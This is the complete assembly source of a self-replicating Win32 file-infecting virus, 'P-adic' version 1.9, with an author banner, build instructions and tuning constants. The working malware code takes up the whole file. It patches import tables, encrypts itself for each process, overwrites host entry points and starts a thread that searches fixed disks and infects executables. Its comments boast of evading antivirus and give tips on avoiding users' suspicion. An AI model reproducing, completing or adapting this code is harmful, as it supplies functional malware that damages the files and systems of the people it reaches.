   .386p
   .model flat

   ; comment $
   ;
   ;  P-adic virus version 1.9
   ;  by Doxtor L. /[T.I] ,2000-2002
   ;
   ;
   ;  Disclaimer:
   ;
   ;  This program is a virus.
   ;  It's not designed to be a destructive one, but anyway it's a virus !
   ;
   ;
   ;  Description:
   ;
   ;  It's a per-process encrypted EPO win32 virus.
   ;  Tested both on Win95 and Win2K.
   ;  It's old style and new style bound aware so the applications
   ;  as calc.exe and notepad.exe on Win9x and Win2K will not
   ;  crash if they are infected!
   ;
   ;  This virus uses several technics:
   ;
   ;  Checksum routine to recognize api strings in the export section
   ;  of the Kernel32.dll
   ;
   ;  Whenever the size of the virus is less than the size of the relocation
   ;  section, if this latter do exist then this section is renamed
   ;  and the virus is placed there.
   ;
   ;  This virus uses a basic EPO routine.
   ;  A short piece of code overwrites the original entry  point of the host
   ;  so the entry point isn't modified.
   ;  The bytes overwritten are saved somewhere in the virus body.
   ;  Obviously, Before to jump to the host code these bytes are restored.
   ;  Pure overwritter viruses are lame, never forget that!
   ;
   ;  The  main feature is that the sections attributes of the host aren't modified,
   ;  i.e if a section is a non-writable one, after infection the section attribute
   ;  is still non-writable.
   ;
   ;  How we do that?
   ;  There are two technics used. The first one is the use of the api GlobalAlloc.
   ;  This api is called first, to create a memory space to decrypt and run the
   ;  main part of the virus there. But we need a special routine to get the address
   ;  of this api.
   ;
   ;  In order to perform this task we search in the Import table of the target,
   ;  an api name with 11 or more letters.
   ;
   ;  We patch the name with the "GlobalAlloc" string.
   ;  At run time, the infected host is loaded in memory by windows, the address
   ;  of the GlobalAlloc api is set. Windows makes the job for us :)
   ;
   ;  Nevetheleast, we need to restore the correct address.
   ;  GetProcAddress api is used.(we can't pre-calculate a checksum for it
   ;  because the name of this api isn't known before infection time)
   ;
   ;  The virus uses the allocated memory space to move to and to decrypt its main routine.
   ;  So when the decryption process is over, the virus jumps to that new memory space.
   ;  It creates an infectious thread and returns to host.
   ;
   ;  the infectious routine is a classic one:
   ;
   ;   -It searchs targets on all fixed disks and then infects them.
   ;   -The thread begins with a pause, the virus stops few seconds before to infect.
   ;   -The virus is composed of 2 parts: a loading routine to create memory space
   ;    and decrypt the virus there (this routine is located in the executable section
   ;    of the host) and the main part of the virus, located in last section.
   ;
   ;
   ;  This virus isn't detected by major anti-viruses at the time it was written.
   ;  So BE CAREFUL!
   ;
   ;
   ;  To compile, use the following file:
   ;
   ;  Syntax is:   compile virus (and not "compile virus.asm")
   ;  [assuming the virus source code is named: virus.asm]
   ;  The assembler used is tasm 5.0
   ;
   ;  ///// begin of compile.bat /////
   ;
   ;
   ; tasm32 /m /ml %1.asm
   ; tlink32 /Tpe /aa /c %1,%1.exe,,import32.lib
   ; rem pewrite.exe set the write attribute in all sections headers
   ; pewrite %1.exe
   ; del %1.obj
   ; del %1.map
   ;
   ;  ///// End of compile.bat /////
   ;
   ; Options:
   ;
   ;  You can set the virus sleeping time, just change the
   ;  constant value called Miliseconds (see the end of the source code)
   ;
   ;  To infect 10 files by loop (for example), set the value of the constant
   ;  "HowMany" to 10 (see the end). But i don't recommand the use of
   ;   numbers greater than 3. A lot of disk accesses could be suspicious
   ;   for the users and increase the rate of corrupted files when the user
   ;   closes the infected program before the infectious routine is terminated.
   ; $

   %out WARNING!
   %out YOU HAVE JUST COMPILED A FULL FUNCTIONNAL VIRUS!
   %out ERASE IT, IF YOU DON'T KNOW WHAT YOU'RE DOING!

   extrn ExitProcess      :Proc                 ;only for the 1st generation
   extrn MessageBoxA      :Proc
   extrn GetProcAddress   :Proc
   extrn GetModuleHandleA :Proc
   extrn Sleep            :Proc

   .data

   db 0

   T         db "Warning!"              ,0
   Message   db "Ready to be infected"  ,0ah,0dh
             db "by P-adic "   ,0ah,0dh
             db "virus v 1.9 /[T.I] ?"  ,0ah,0dh,0

   Message2  db "Exit infection?",0

   Krl32     db "KERNEL32.DLL",0
   EP        db "ExitProcess",0            ;only for 1st generation
   EpAdd     dd  0                         ;fake variable for 1st generation

   ;macros:
    OpenFileStuff macro
           push 0
           push 0
           push 3
           push 0
           push 1
           push 80000000h or 40000000h              ;Read and Code abilities
           lea eax,FileName+ebp
           push eax
           call dword ptr [_CreateFileA+ebp]
           mov  dword ptr [FileHandle+ebp],eax      ;save FileHandle
           push 0
           push dword ptr [FileSize+ebp]
           push 0
           push 4
           push 0
           push dword ptr [FileHandle+ebp]
           call dword ptr [_CreateFileMappingA+ebp]
           mov  dword ptr [MapHandle+ebp],eax
           push dword ptr [FileSize+ebp]
           push 0
           push 0
           push 2
           push dword ptr [MapHandle+ebp]
           call dword ptr [_MapViewOfFile+ebp]
           or eax,eax
           jz ExitOpenFileStuffError
           mov dword ptr [MapAddress+ebp],eax     ;eax=Address of Mapping
           xchg eax,edx
           clc
       endm

    CloseFileStuff macro
    UnMap:
           push dword ptr [MapAddress+ebp]
           call dword ptr [_UnmapViewOfFile+ebp]

    CloseMapHandle:

           push dword ptr [MapHandle+ebp]
           call dword ptr [_CloseHandle+ebp]

    ResizeFile:

           push 0
           push 0
           push dword ptr [FileSize+ebp]
           push dword ptr [FileHandle+ebp]
           call dword ptr [_SetFilePointer+ebp]

    MarkEndOfFile:

           push dword ptr [FileHandle+ebp]
           call dword ptr [_SetEndOfFile+ebp]

   RestoreTime:

           lea eax,LastWriteTime+ebp
           push eax
           lea eax,LastAccessTime+ebp
           push eax
           Lea eax,CreationTime+ebp
           push eax
           push dword ptr [FileHandle+ebp]
           call dword ptr [_SetFileTime+ebp]


    CloseFile:

           push dword ptr [FileHandle+ebp]
           call dword ptr [_CloseHandle+ebp]

    RestoreFileAttributs:

           push dword ptr [FileAttributes+ebp]
           lea eax,FileName+ebp
           push eax
           call dword ptr [_SetFileAttributesA+ebp]
           endm

   .code                                   ;code executable starts here


   HOST:
   jmp Over

   db 40 dup (90h)

   push 60000
   call Sleep

   push 30h
   push offset T
   push offset Message2
   push 0
   call MessageBoxA

   push 0
   call ExitProcess

   Over:
   mov eax,LoaderLength
   mov eax,EndVir-BeginVir
   push 30h
   push offset T
   push offset Message
   push 0
   call MessageBoxA

   push offset Krl32
   call GetModuleHandleA

   push offset EP
   push eax
   call GetProcAddress

   ;useless , but needed for 1st generation

   mov dword ptr [EpAdd],eax

   mov dword ptr [Import],offset  EpAdd

   mov dword ptr [HackAdd],offset EpAdd

   mov eax,EndVir-BeginVir

   ;[real start of virus]:

   BeginVir:

           call Delta

    Delta:                                        ;compute delta offset
           pop ebp
           sub ebp,offset Delta

   ComputeKernelAddress:


            db 8bh,15h       ;mov edx,dword [Import]
            Import dd 0      ;Import is an address in Import table
                             ;[ ]= adress of GlobalAlloc (in second generation)

   ;***** Search kernel32.dll address in memory
   ;      In :edx=address in kernel32
   ;***** Out:edx=kernel32.dll address

           mov eax,edx

    Loop:

           dec edx
           cmp word ptr [edx],"ZM"
           jnz Loop

    MZ_found:

           mov ecx,edx
           mov ecx,[ecx+03ch]
           add ecx,edx
           cmp ecx,eax

           jg Loop                                ;this test avoid page fault

           cmp word ptr [ecx] ,"EP"
           jnz Loop

   ;***** End of search kernel routine

   ;***** Search apis addresses needed
   ;      In : edx=IMAGE BASE of KERNEL32
   ;***** Out: Searched Apis addresses are put in a Table of Dword

           mov eax,[edx+3ch]      ;eax=RVA of PE-header
           add eax,edx            ;eax=Address of PE-header
           mov eax,[eax+78h]      ;eax=RVA of EXPORT DIRECTORY section
           add eax,edx            ;eax=Address of EXPORT DIRECTORY section
           mov esi,[eax+20h]      ;esi=RVA of the table containing pointers


           add esi,edx            ;esi=Address of this table,
                                  ;a pointer to the name of the first
                                  ;exported function


           xor ebx,ebx                            ;ebx holds Api index
           dec ebx
           mov ecx,ApiNb                          ;number of Apis remaining
           sub esi,4

    MainLoop:

           add esi,4

           inc ebx

   ;***** Crc computing of the current Api name
   ;      In : esi: RVA of name
   ;***** Out: Crc variable  contains the Crc of current name string

    ComputeCrc:

           pushad
           mov esi,dword ptr [esi]
           add esi,edx
           xor ecx,ecx
           xor eax,eax

    Again:

           Lodsb
           or al,al
           jz SeeU
           add cl,al
           rol eax,cl
           add ecx,eax
           jmp Again

    SeeU:

           mov dword ptr [Crc+ebp],ecx
           popad

   ;***** End of crc computing routine

   ;***** Test Crc
   ;      In : Esi: Current Api name address
   ;      Out: Esi= following name
   ;***** Ecx= Api (pointer) index in the "table of names"

    TestCrc:

           push eax
           mov eax,dword ptr [Crc+ebp]
           mov ecx,ApiNb+1
           lea edi,ApiList+ebp
           repne scasd
           pop eax
           jecxz MainLoop

           Found:

           pushad
           add edi,offset _CloseHandle-(offset ApiList+4) ;Api position
                                                         ;in our table

           mov ecx,dword ptr [eax+36]
           add ecx,edx
           lea ecx,[ecx+2*ebx]
           mov bx,word ptr [ecx]
           mov ecx,dword ptr [eax+1ch]
           add ecx,edx
           mov ecx,dword ptr [ecx+4*ebx]
           add ecx,edx
           mov dword ptr [edi],ecx
           popad
           Loop MainLoop

   ;***** End of crc test routine

   ;***** End of Apis searching routine

   ;We need to patch the import table of host.
   ;But first we need to compute the address of the Api we have replaced
   ;by GlobalAlloc

   ;[Compute address of hacked api]:

    lea ebx,ApiHack+ebp
    push ebx
    push edx
    call dword ptr [_GetProcAddress+ebp]
    mov  dword ptr [ApiOriginalAdd+ebp],eax

   call dword ptr [_GetCurrentProcessId+ebp]

   ;[Restore host first executable bytes]:

   push eax
   push 0
   push 10h or 20h or 08h
   call dword ptr [_OpenProcess+ebp]
   xchg eax,ebx

   push 0
   push LoaderLength
   lea eax,SaveHost+ebp
   push eax
   db 68h
   PushPatch:
   dd 401000h

   push ebx
   call dword ptr [_WriteProcessMemory+ebp]

   ;[Restore host hacked api]:

   push 0
   push 4
   lea eax,ApiOriginalAdd+ebp
   push eax
   db 68h
   HackAdd:
   dd 0

   push ebx
   call Dword ptr [_WriteProcessMemory+ebp]

    ;[Create_Thread]:

    lea ebx,ThreadID+ebp
    push ebx
    push 0
    push 0
    lea ebx,_Thread+ebp
    push ebx
    push 0
    push 0
    call dword ptr [_CreateThread+ebp]

    ;[Return to host]:

     db 68h                                       ;push OldEip
     OldEip dd 401002h
     ret

    _Thread:

    call DeltaOff
    DeltaOff:
    pop ebp
    sub ebp,offset DeltaOff

    push Miliseconds
    call dword ptr [_Sleep+ebp]

   ;[Save current directory]:

           lea eax,DirExe+ebp
           push eax
           push 260
           call Dword ptr [_GetCurrentDirectoryA+ebp]

   ;***** Main routine (directory-tree search algorithm)

           mov dword ptr [Counter+ebp],HowMany
           mov dword ptr [Depth+ebp],0

    mov eax,dword ptr [Key+ebp]

    SearchDisk:

    xor edx,edx         ;32-bits number random generator
    mov ecx,A
    mul ecx
    add eax,C
    adc edx,0
    mov ecx,B
    div ecx
    mov eax,edx
    mov dword ptr [Key+ebp],eax

    and al,00000011b
    add al,43h
    mov byte  ptr [DiskName+ebp],al

    lea eax,DiskName+ebp
    push eax
    call dword ptr [_GetDriveTypeA+ebp]
    cmp eax,3
    jnz SearchDisk

            db 0c7h,85h
            dd offset FileName
            DiskName db "C"
            db ":\",0

    Find0:
           inc dword ptr [Depth+ebp]
           push ebx
           lea eax,FileName+ebp
           push eax
           call dword ptr [_SetCurrentDirectoryA+ebp]

   ;******  InfectCurrentDir

           lea esi,FileAttributes+ebp
           push esi
           lea edi,FindMatch+ebp
           push edi
           call dword ptr [_FindFirstFileA+ebp]
           mov ebx,eax
           inc eax
           jz FindF

           call Infect

    Next:
           push esi
           push ebx
           call [_FindNextFileA+ebp]
           or eax,eax
           jz FindF

           call Infect

           jmp Next

   ;***** End of infect current dir routine

   ;[Findfirst dir]:

    FindF:
            lea esi,FileAttributes+ebp
            push esi
            lea edi,FindMatch2+ebp
            push edi
            call dword ptr [_FindFirstFileA+ebp]

            mov ebx,eax
            inc eax
            jz Updir0

    Find:
            mov eax,dword ptr [FileAttributes+ebp]
            and eax,10h
            jz FindN

            cmp byte ptr [FileName+ebp],"."
            jnz Find0

   ;[FindNext dir routine]:

    FindN:
           lea esi,FileAttributes+ebp
           push esi
           push ebx
           call dword ptr [_FindNextFileA+ebp]
           or eax,eax
           jnz Find

    Updir:
           push ebx
           call dword ptr [_FindClose+ebp]

    Updir0:
           dec dword ptr [Depth+ebp]
           jz Exit
           pop ebx
           lea eax,DotDot+ebp

           push eax
           call dword ptr [_SetCurrentDirectoryA+ebp]
           jmp FindN

    Exit:                                         ;jmp to host code

   ;[Restore saved directory]:

           lea eax,DirExe+ebp
           push eax
           call dword ptr [_SetCurrentDirectoryA+ebp]
           jmp _Thread

   Infect:

          pushad

    TestFile:

          add dword ptr [FileSize+ebp],VirLength

   ;***** Test if the file is a true PE-executable file

          OpenFileStuff
          jc ExitInfectError

          push edx                                ;save mapping address

          cmp dword ptr [edx+3ch],200h            ;Avoid Page Fault
          jg ExitInfectError0

          add edx,dword ptr [edx+3ch]             ;edx points to PE-header
          cmp word ptr [edx],"EP"                 ;true PE exe there?
          jnz ExitInfectError0

   ;***** End of EXE-PE test

   ;***** Already infected?

          pop ecx
          cmp word ptr [ecx+12h],"IT"             ;infected?
          jz ExitInfectError
          push ecx

   ;**** End of infection test

          mov edi,edx
          add edi,18h                             ;edi=beginning of optional header

   ;[Compute the return address to target code]:

          mov ebx,dword ptr [edi+10h]             ;ebx=Entry Point RVA
          push ebx                                ;save it

          mov dword ptr [RVA_EP+ebp],ebx
          add ebx,dword ptr [edi+1ch]             ;ebx=ImageBase Address in
                                                  ;memory
          mov dword ptr [OldEip+ebp],ebx          ;save it
          mov dword ptr [PushPatch+ebp],ebx

          movzx ecx,word ptr [edx+14h]            ;cx=size of optionnal header
          add edi,ecx                             ;edi points to 1st section header
          movzx ecx,word ptr [edx+06h]            ;cx= number of sections
          mov dword ptr [SectN+ebp],ecx
          mov ebx,edi                             ;ebx points on 1st section header

   ;compute last section header address

          xor eax,eax                             ;set eax=0
          dec ecx                                 ;ecx=number of sections -1

          mov esi,edi                             ;esi=first section header
                                                  ;address
          mov al,28h                              ;al=size of a section header
          mul cl                                  ;eax=28h*(number of section-1)
          add esi,eax                             ;esi=pointer to last section
                                                  ;header
   ;ebx,edi=beginning of 1st section header

          pop eax                                 ;put Entry Point RVA in eax

   ;***** Search code section:
   ;      In : edi holds file pointer to first section header
   ;         : eax holds Entry Point RVA
   ;***** Out: edi holds File ptr to the "code section"

           NotEnough:
           add edi,28h
           cmp dword ptr [edi+12],eax
           jg FoundCode
           loop NotEnough
           jmp ExitInfectError0

           FoundCode:
           sub edi,28h

   ;***** Search code section end

           cmp dword ptr [esi+16],0         ;don't want to infect files
           jz ExitInfectError0              ;with rawdata size=0 ...
                                            ;no real section on disk here
                                            ;if we try ...file is overwritten!

           mov eax,dword ptr [esi+24h]      ;don't want to infect files
           and eax,80000000h                ;with a last section writable
           jnz ExitInfectError0             ;surely an exe archive or packed file

   ;ebx= begin of section headers
   ;edi= begin of code section

   ;eax = "code section" offset in mapping area

             pop  eax                            ;restore and save Entry Point
             push eax                            ;RVA

             add eax,dword ptr [edi+14h]         ;compute file pointer of

             add eax,dword ptr [RVA_EP+ebp]      ;Entry Point on disk

             sub eax,dword ptr [edi+0ch]

   ;[Import table patching routine]:

          pushad
          push dword ptr [edx+18h+1ch]            ;save on stack ImageBase

          mov eax,dword ptr [edx+80h]             ;eax= address of the
                                                  ;"import table"

   ;eax=RVA "Imports table"
   ;ebx=RVA  "Sections table"

   call Rva2Offset                                ;eax=file pointer to Import table
   xchg eax,edi                                   ;edi= "     "      "   "     "

   SearchDll:

   mov eax,dword ptr [edi+12]

   or eax,eax
   je _NotFound

   call Rva2Offset

   cmp dword ptr [eax],"NREK"                   ;are there imports
   je DllFound                                  ;from kernel32.dll?

   cmp dword ptr [eax],"nrek"                   ;  "      "
   je DllFound

   add edi,20
   jmp SearchDll

   _NotFound:
   pop eax
   popad
   jmp ExitInfectError0

   DllFound:
   cmp dword ptr [edi+4],-1
   jnz NotNewStyleBound

   add esi,28h                           ;esi points to the start of the
                                         ;bound directory
   mov edx,esi

   ExploreBoundDir:
   add edx,4                              ;"pointer" to the name of a dll
                                          ;exporting functions

   movzx eax,word ptr [edx]
   add eax,esi
   cmp dword ptr [eax],"NREK"
   jz FoundBoundDll
   cmp dword ptr [eax],"nrek"
   jnz ExploreBoundDir

   FoundBoundDll:
   sub edx,4
   mov dword ptr [edx],0

   NotNewStyleBound:
   mov dword ptr [edi+4],0                ;TimeDate stamp set to 0
   mov dword ptr [edi+8],0
   mov eax,dword ptr [edi]                ;eax=RVA of OriginalFirstThunk
   mov edx,dword ptr [edi+16]             ;edx=RVA of FirstThunk

   or eax,eax
   jz No_OFT

   pushad

   call Rva2Offset                        ;compute OFT file pointer

   push eax                               ;save OFT file pointer

   ;[Compute the number of imported APIs from KERNEL32.DLL]:

   xor ecx,ecx
   sub eax,4

   ApiScan:
   inc ecx
   add eax,4
   cmp dword ptr [eax],0
   jnz ApiScan
   dec ecx

   ;******************************************************************

   pop  eax                        ;restore OFT file pointer

   mov esi,eax
   mov eax,edx
   call Rva2Offset
   xchg edi,eax
   rep movsd

   popad
   jmp OFT_Found

   No_OFT:
   mov eax,edx

   OFT_Found:

   call Rva2Offset                        ;eax contains the RVA of an array of
                                          ;RVAs.
                                          ;Each of these RVAs points to a structure
                                          ;The number of structures equal the
                                          ;number of imported functions from
                                          ;kernel32.dll
                                          ;We need to convert eax into a file
                                          ;pointer.

   sub edx,4
   sub eax,4
   lea edi,ApiHack+ebp

   Loop2:

   add eax,4
   add edx,4
   mov esi,dword ptr [eax]                ;read an RVA of array
   or esi,esi

   jz _NotFound

   test esi,80000000h                     ;ordinal?
   jnz Loop2
   xor ecx,ecx
   xchg eax,esi                           ;convert RVA to file offset

   call Rva2Offset

   xchg eax,esi

   inc esi                                ;esi points to api name
   inc esi

   ;[save the API name and compute its size]:

   push esi
   push edi

   DoAgain:                              ;move the api name into ApiHack

   movsb

   inc ecx

   cmp byte ptr [esi-1],0                ;end of string?
   jnz DoAgain

   pop edi
   pop esi

   ;************************************************************************

   cmp cl,12                             ;string + ",0" is 12 char?
   jl Loop2                              ;not enough?...go back to Loop2

   xchg esi,edi
   lea esi,GlobalAPI+ebp

   mov cl,12                             ;GlobalAlloc string replace
   rep movsb                             ;one of api of the host

   pop edi                               ;edi =ImageBase of target

   add edx,edi                           ;address in Import table

   mov dword ptr [ReturnAdd+ebp],edx     ;patchs needed
   mov dword ptr [HackAdd+ebp],edx
   mov dword ptr [Import+ebp],edx

   popad

   ;***** End Import table Patching routine

           pop edi                      ;restore MapAddress

           push eax                     ;save file pointer to code loader
           push eax

           add dword ptr [Key+ebp],0FEDCBA98h ;modify key

           mov  word ptr [edi+12h],"IT"     ;mark the infected target
           mov dword ptr [edx+18h+24h],200h ;set FileAligment=200h

            mov ecx,dword ptr [esi+0ch]
            add edi,dword ptr [esi+14h]

            cmp dword ptr [edx+18h+96+40],ecx
            jnz NoReloc

            cmp dword ptr [esi+10h],800h
            jnge NoReloc

   ;[Erase Relocation Section]:

           mov dword ptr [edx+18h+96+40],0
           mov dword ptr [edx+18h+96+44],0

           mov dword ptr [esi],"adP."
           mov dword ptr [esi+4],"at"

           add ecx,dword ptr [edx+18h+1ch]
               mov dword ptr [LastSectionCode+ebp],ecx
               sub dword ptr [FileSize+ebp],VirLength

           jmp SaveFirstBytes

   NoReloc:

           add edi,dword ptr [esi+10h]      ;add rounded up last section raw-size

   ;[Compute beginning of code in the last section ,in memory]:

           mov ecx,dword ptr [esi+0ch]      ;last section RVA in memory
           add ecx,dword ptr [esi+10h]      ;add last section rounded up size
           add ecx,dword ptr [edx+18h+1ch]  ;add address base of target
           mov dword ptr [LastSectionCode+ebp],ecx

   ;[Update size field in target last section header]:

           add dword ptr [esi+10h],800h
           add dword ptr [esi+08h],1000h

   ;[Update size fields in target optional header]:

            add dword ptr [edx+50h],1000h

   ;[Save first bytes of host code]:

   SaveFirstBytes:

   pop esi                                  ;map pointer to beginning of code
   mov ecx,LoaderLength
   push ecx                                 ;save size of loader

   push edi
   lea edi,SaveHost+ebp                     ;save beginning of code in virus body
   repne movsb
   pop  edi

   ;[Copy and encrypt code in the last section]:

           mov ecx,(EndVir-BeginVir)/4
           lea esi,BeginVir+ebp
           call Crypt

   ;[ClearHeap]:

            push edi
            mov ecx,dword ptr [FileSize+ebp]
            sub edi,dword ptr [MapAddress+ebp]
            sub ecx,edi                            ;ecx=number of useless bytes in
                                                   ;the heap
            pop edi

            xor eax,eax                            ;set eax to 0

   Nullify:
            repne stosb

   ;[Copy loader code to target file on disk]:

           pop ecx
           pop edi                     ;restore pointer (on disk) to code loader
           lea esi,BeginLoader+ebp
           repne movsb

           dec dword ptr [Counter+ebp]
           jmp GetOut

    ExitInfectError2:

           pop eax

    ExitInfectError0:

           pop eax

    ExitInfectError:

           sub dword ptr [FileSize+ebp],VirLength
    GetOut:
           CloseFileStuff
           popad
           ret

    ExitOpenFileStuffError:

           stc
           ret

    ;change a RVA to a file pointer
    ;In : ebx points to first section
    ;Out: eax contains the file offset

    Rva2Offset:

           push ebx
           push ecx

           mov ecx,dword ptr [SectN+ebp]

           _Loop:

           cmp dword ptr [ebx+12],eax

           jg _Find

           NoRawData:

           add ebx,28h

           loop  _Loop

    _Find:

           sub eax,dword ptr [ebx-28h+12]
           add eax,dword ptr [ebx-28h+20]
           add eax,dword ptr [MapAddress+ebp]

           pop ecx
           pop ebx

           ret

    BeginLoader:

           push 2000h
           push 0
           db 0ffh,15h          ;call GlobalAlloc
           ReturnAdd dd 0

           push eax             ;prepare jump to virus
           xchg eax,edi         ;added to modify scan string

           mov ecx,(VirLength)/4
           db 0beh              ;mov esi,****
           LastSectionCode dd 0

    Crypt:
           lodsd
           db 35h
           Key dd 0abcdef12h
           stosd
           dec ecx
           jnz Crypt
           ret                  ;go to beginning of code

    EndLoader:

           SaveHost db 0ebh,4ch
                    db 35 dup (90h)


   Constants:

           B                        equ 134217729
           A                        equ 44739244
           C                        equ 134217727
           ApiNb                    equ 21
           MaxPath                  equ 260
           Miliseconds              equ 5000
           HowMany                  equ 3
           VirLength                equ 800h
           VirLength0               equ EndVir0-BeginVir
           LoaderLength             equ EndLoader-BeginLoader

           Sign                     db "P-adic virus version 1.9"
                                    db "DoxtorL./[T.I]/2000-2002"

           FindMatch                db  "goat*.exe",0
           FindMatch2               db  "*.*",0
           DotDot                   db  "..",0
           GlobalAPI                db "GlobalAlloc",0
           ApiHack                  db "GlobalAlloc",0  ;only for the
                                                        ;1st generation
                                    db 25 dup (0)       ;reserved for char
                                                        ;of api name found


    ApiList                         dd 0fdbe9ddfh  ;CloseHandle
                                    dd 04b00fba1h  ;CreateFileA
                                    dd 00d6ea22eh  ;CreateFileMappingA
                                    dd 0be307c51h  ;CreateThread
                                    dd 0be7b8631h  ;FindClose
                                    dd 0c915738fh  ;FindFirstFileA
                                    dd 08851f43dh  ;FindNextFileA
                                    dd 028f8c6fbh  ;GetCurrentDirectoryA
                                    dd 00029ecfbh  ;GetCurrentProcessId
                                    dd 09c3a5210h  ;GetDriveTypeA
                                    dd 040bf2f84h  ;GetProcAddress
                                    dd 032beddc3h  ;MapViewOfFile
                                    dd 0c329f65bh  ;OpenProcess
                                    dd 08e0e5487h  ;SetCurrentDirectoryA
                                    dd 0bc738ae6h  ;SetEndOfFile
                                    dd 050665047h  ;SetFileAttributesA
                                    dd 06d452a3ah  ;SetFilePointer
                                    dd 09f69de76h  ;SetFileTime
                                    dd 03a00e23bh  ;Sleep
                                    dd 0fae00d65h  ;UnmapViewOfFile
                                    dd 01e9fa310h  ;WriteProcessMemory

   EndVir:                          ;What is following isn't appended to target

   ;ApiAddresses:

           _CloseHandle              dd 0
           _CreateFileA              dd 0
           _CreateFileMappingA       dd 0
           _CreateThread             dd 0
           _FindClose                dd 0
           _FindFirstFileA           dd 0
           _FindNextFileA            dd 0
           _GetCurrentDirectoryA     dd 0
           _GetCurrentProcessId      dd 0
           _GetDriveTypeA            dd 0
           _GetProcAddress           dd 0
           _MapViewOfFile            dd 0
           _OpenProcess              dd 0
           _SetCurrentDirectoryA     dd 0
           _SetEndOfFile             dd 0
           _SetFileAttributesA       dd 0
           _SetFilePointer           dd 0
           _SetFileTime              dd 0
           _Sleep                    dd 0
           _UnmapViewOfFile          dd 0
           _WriteProcessMemory       dd 0

   ;Variables:
           FileHandle               dd 0
           MapHandle                dd 0
           HostNewRawSize           dd 0
           MapAddress               dd 0
           Counter                  dd 0
           Crc                      dd 0
           Depth                    dd 0
           ThreadID                 dd 0
           SectAdd                  dd 0
           SectN                    dd 0
           RVA_EP                   dd 0
           ApiOriginalAdd           dd 0

   ;search structure:

           FileAttributes           dd ?               ; attributes
           CreationTime             dd ?,?             ; time of creation
           LastAccessTime           dd ?,?             ; last access time
           LastWriteTime            dd ?,?             ; last modificationm
           FileSizeHigh             dd ?               ; filesize
           FileSize                 dd ?               ;
           Reserved0                dd ?               ;
           Reserved1                dd ?               ;
           FileName                 db MaxPath DUP (?) ; long filename
           AlternateFileName        db 13 DUP (?)      ; short filename
           DirExe                   db MaxPath DUP (?)
    EndVir0:
   end HOST
